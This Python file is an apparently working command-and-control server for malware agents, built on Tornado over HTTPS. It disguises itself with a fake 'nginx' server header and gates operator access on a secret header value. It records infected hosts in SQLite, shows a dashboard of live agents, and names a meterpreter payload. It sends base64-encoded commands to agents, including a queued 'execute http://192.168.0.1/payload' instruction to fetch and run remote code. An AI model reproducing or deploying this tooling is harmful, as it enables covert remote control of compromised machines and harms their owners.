#!/usr/bin/python3

import os
import sqlite3
import tornado.httpserver
import tornado.web
import tornado.ioloop
import hashlib

from datetime import datetime
from datetime import timedelta

""" create database """
conn = sqlite3.connect('application.db')
c = conn.cursor()
try:
    c.execute('''CREATE TABLE agents (alive_time datetime, agent text, ip text, install datetime, sysinfo text, \
                                      arch text, platform text, hostname text, version text, process text)''')

    """ create table for system: privilege, exploit,"""

    c.execute('''CREATE TABLE payloads (name text, arch text, platform text)''')

except sqlite3.OperationalError:
    pass

""" handler for web request """
class MainHandler(tornado.web.RequestHandler):
    def set_default_headers(self):
        self.set_header("Server", "nginx")

    def post(self):
        try:
            content = self.request.headers['Content-Type']
        except:
            return

        if content == 'application/xian':
            try:
                access = self.request.headers['X-Access']
            except:
                return

            if access == 'd41d8cd98f00b204e9800998ecf8427e':

                try:
                    params = self.request.headers['X-Origin']
                except:
                    pass
                else:
                    # set payload for execute
                    if params == 'payload':
                        print ("name=meterpreter, arch=x86_64, platform=linux,")
                        #print ("name=meterpreter, arch=x86, platform=linux,")

                        pass

                    # show dashboard
                    if params == 'dashboard':
                        alive_time = datetime.timestamp(datetime.now() - timedelta(minutes=1))
                        c.execute("select * from agents where alive_time > ?", (alive_time, ))
                        rows = c.fetchall()
                        count = len(rows)
                        items = []
                        for i in range(count):
                            item = {"platform": rows[i][6], "hostname": rows[i][7], "ip": rows[i][2], "arch": rows[i][5], "sinfo": rows[i][4], "ver": rows[i][8]}
                            items.append(item)

                        self.render("table.html", title="Dashboard", count=count, items=items)

                return

        if content == 'application/x-www-form-urlencoded':
            print("[+]request from %s\n" % self.request.remote_ip)
            print("[+] %s\n" % self.request.body)

            self.set_header("Access-Control", "cnVu")
            self.write("Y2F0IC91c3IvYmluL3RvdWNo")

        self.finish()


"""
            now = datetime.now()

            ip = self.request.remote_ip
            alive_time = datetime.timestamp(now)
            install = datetime.timestamp(now)
            
            arch = self.get_argument('arch')
            sysinfo = self.get_argument('sysinfo')
            platform = self.get_argument('platform')
            host = self.get_argument('host')
            version = self.get_argument('version')
            process = 'ZXhlY3V0ZSBodHRwOi8vMTkyLjE2OC4wLjEvcGF5bG9hZA=='

            agent = ("{}{}{}{}{}".format(ip, sysinfo, arch, platform, version))
            agent = (hashlib.md5(agent.encode('utf-8')).hexdigest())

            c.execute("select agent from agents where agent=?", (agent, ))
            rows = c.fetchall()

            if len(rows) == 0:
                print("[+] Success, new agent installed! Received data from %s\n" % self.request.remote_ip)
                c.execute("insert into agents values (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                          (alive_time, agent, ip, install, sysinfo, arch, platform, host, version, process))

                conn.commit()
            else:
                now = datetime.now()
                alive_time = datetime.timestamp(now)
                c.execute("update agents set alive_time=? where agent=?", (alive_time, agent))
   
                print("[+]request from %s\n" % self.request.remote_ip)

                c.execute("select process from agents where agent=?", (agent,))
                tasks = c.fetchone()

                if len(tasks) > 0:
                    self.set_header("Access-Control",  str(tasks[0]))
                    c.execute("update agents set process='' where agent=?", (agent,))
                    conn.commit()
"""


""" entry point """
def main():
    # Generate SSL cert
    print("[+] Generating SSL certificate for our HTTPS web server \n")
    os.system("echo -e '\n\n\n\n\n\n\n\n\n' | openssl req  -nodes -new -x509  -keyout server.key -out server.cert 2>/dev/null")

    application = tornado.web.Application([
        (r'/', MainHandler),
    ])

    http_server = tornado.httpserver.HTTPServer(application, ssl_options={
            "certfile": os.path.join("./", "server.cert"),
            "keyfile": os.path.join("./", "server.key"),
        },max_buffer_size=10485760000)

    http_server.listen(443)
    print("[+] Start C&C server\n")

    tornado.ioloop.IOLoop.current().start()

if __name__ == "__main__":
    main()

